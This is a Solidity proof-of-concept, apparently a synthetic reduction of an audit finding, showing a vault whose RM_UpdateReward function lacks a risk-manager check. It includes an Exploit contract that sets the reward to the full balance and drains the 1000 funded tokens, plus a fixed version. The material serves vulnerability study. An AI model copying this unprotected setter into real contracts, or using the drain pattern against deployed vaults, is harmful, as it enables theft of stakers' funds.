// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  TRZN VaultETH_V2.RM_UpdateReward — no access control (Zokyo, finding 37230).

    SYNTHETIC, cheatcode-free reduction. The report says the function is for
    risk managers but any user can call it. Here it sets the reward paid out
    of the vault's reward token. The attacker sets it to the full balance and
    claims the 1000 tokens that were funded for stakers.

    run() does not warp. */

contract RewardToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VaultETH_V2 {
    RewardToken public rewardToken;
    address public riskManager;
    uint256 public reward;
    uint256 public claimed;

    constructor(RewardToken rewardToken_, address riskManager_) {
        rewardToken = rewardToken_;
        riskManager = riskManager_;
    }

    function RM_UpdateReward(uint256 newReward) external {
        // @> VULN: RM_UpdateReward has no risk-manager check
        reward = newReward;
    }

    function claim() external {
        uint256 amount = reward;
        reward = 0;
        claimed = amount;
        rewardToken.transfer(msg.sender, amount);
    }
}

contract VaultETH_V2Fixed {
    RewardToken public rewardToken;
    address public riskManager;
    uint256 public reward;

    constructor(RewardToken rewardToken_, address riskManager_) {
        rewardToken = rewardToken_;
        riskManager = riskManager_;
    }

    function RM_UpdateReward(uint256 newReward) external {
        require(msg.sender == riskManager, "risk");
        reward = newReward;
    }
}

contract Exploit {
    uint256 public constant DRAINED = 1000 ether;

    RewardToken public rewardToken;
    VaultETH_V2 public vault;
    address public riskManager;
    uint256 public taken;

    constructor() {
        rewardToken = new RewardToken();
        riskManager = address(0xBEEF);
        vault = new VaultETH_V2(rewardToken, riskManager);
        rewardToken.mint(address(vault), DRAINED);
    }

    function run() external {
        vault.RM_UpdateReward(DRAINED);
        vault.claim();
        taken = rewardToken.balanceOf(address(this));
        require(msg.sender != riskManager, "not the risk manager");
        require(taken == DRAINED, "taken");
        require(rewardToken.balanceOf(address(vault)) == 0, "vault empty");
        require(vault.claimed() == DRAINED, "claimed");
    }
}
